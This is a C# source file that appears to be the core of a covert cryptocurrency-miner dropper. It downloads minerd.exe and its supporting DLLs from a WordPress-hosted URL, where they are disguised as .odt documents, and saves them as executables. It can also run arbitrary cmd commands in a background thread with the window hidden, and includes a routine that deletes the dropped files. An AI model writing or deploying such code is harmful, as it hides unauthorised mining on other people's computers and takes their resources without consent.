using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace INziftr
{
    internal class Methods
    {
        public static void Cs(object c)
        {
            {
                var p = new ProcessStartInfo(@"cmd", @"/c" + c)
                {
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = Global.hide  // TRUE = Hide Window, FALSE = Show Window
                };
                var pc = new Process
                {
                    StartInfo = p
                };
                pc.Start();
                var result = pc.StandardOutput.ReadToEnd();
                Console.WriteLine(result);
            }
        }

        public static void Cas(string c)
        {
            try
            {
                var hide = Global.hide;
                var objThread = new Thread(new ParameterizedThreadStart(Cs))
                {
                    IsBackground = true,
                    Priority = ThreadPriority.AboveNormal
                };
                objThread.Start(c);
            }
#pragma warning disable CS0168 // Variable is declared but never used
            catch (Exception ex)
#pragma warning restore CS0168 // Variable is declared but never used
            {
                throw;
            }
        }

        public static void DelFiles()
        {
            var wc = new WebClient();

            if (File.Exists(Global.location + @"\minerd.exe"))
            {
                File.Delete(Global.location + @"\minerd.exe");
            }
            if (File.Exists(Global.location + @"\libcurl.dll"))
            {
                File.Delete(Global.location + @"\libcurl.dll");
            }
            if (File.Exists(Global.location + @"\libeay32.dll"))
            {
                File.Delete(Global.location + @"\libeay32.dll");
            }
            if (File.Exists(Global.location + @"\ssleay32.dll"))
            {
                File.Delete(Global.location + @"\ssleay32.dll");
            }
            if (File.Exists(Global.location + @"\zlib1.dll"))
            {
                File.Delete(Global.location + @"\zlib1.dll");
            }

            if (Directory.Exists(Global.location))
            {
                Directory.Delete(Global.location);
            }
        }

        public static void DlFiles()
        {
            var wc = new WebClient();
            if (!Directory.Exists(Global.location))
            {
                Directory.CreateDirectory(Global.location);

                if (!File.Exists(Global.location + @"\minerd.exe"))
                {
                    wc.DownloadFile(@"https://pimpledoot.files.wordpress.com/2015/04/minerd.odt", Global.location + @"\minerd.exe");
                }
                if (!File.Exists(Global.location + @"\libcurl.dll"))
                {
                    wc.DownloadFile(@"https://pimpledoot.files.wordpress.com/2015/04/libcurl.odt", Global.location + @"\libcurl.dll");
                }
                if (!File.Exists(Global.location + @"\libeay32.dll"))
                {
                    wc.DownloadFile(@"https://pimpledoot.files.wordpress.com/2015/04/libeay32.odt", Global.location + @"\libeay32.dll");
                }
                if (!File.Exists(Global.location + @"\ssleay32.dll"))
                {
                    wc.DownloadFile(@"https://pimpledoot.files.wordpress.com/2015/04/ssleay32.odt", Global.location + @"\ssleay32.dll");
                }
                if (!File.Exists(Global.location + @"\zlib1.dll"))
                {
                    wc.DownloadFile(@"https://pimpledoot.files.wordpress.com/2015/04/zlib1.odt", Global.location + @"\zlib1.dll");
                }
            }
            else if (Directory.Exists(Global.location))
            {
                if (!File.Exists(Global.location + @"\minerd.exe"))
                {
                    wc.DownloadFile(@"https://pimpledoot.files.wordpress.com/2015/04/minerd.odt", Global.location + @"\minerd.exe");
                }
                if (!File.Exists(Global.location + @"\libcurl.dll"))
                {
                    wc.DownloadFile(@"https://pimpledoot.files.wordpress.com/2015/04/libcurl.odt", Global.location + @"\libcurl.dll");
                }
                if (!File.Exists(Global.location + @"\libeay32.dll"))
                {
                    wc.DownloadFile(@"https://pimpledoot.files.wordpress.com/2015/04/libeay32.odt", Global.location + @"\libeay32.dll");
                }
                if (!File.Exists(Global.location + @"\ssleay32.dll"))
                {
                    wc.DownloadFile(@"https://pimpledoot.files.wordpress.com/2015/04/ssleay32.odt", Global.location + @"\ssleay32.dll");
                }
                if (!File.Exists(Global.location + @"\zlib1.dll"))
                {
                    wc.DownloadFile(@"https://pimpledoot.files.wordpress.com/2015/04/zlib1.odt", Global.location + @"\zlib1.dll");
                }
            }
        }
    }
}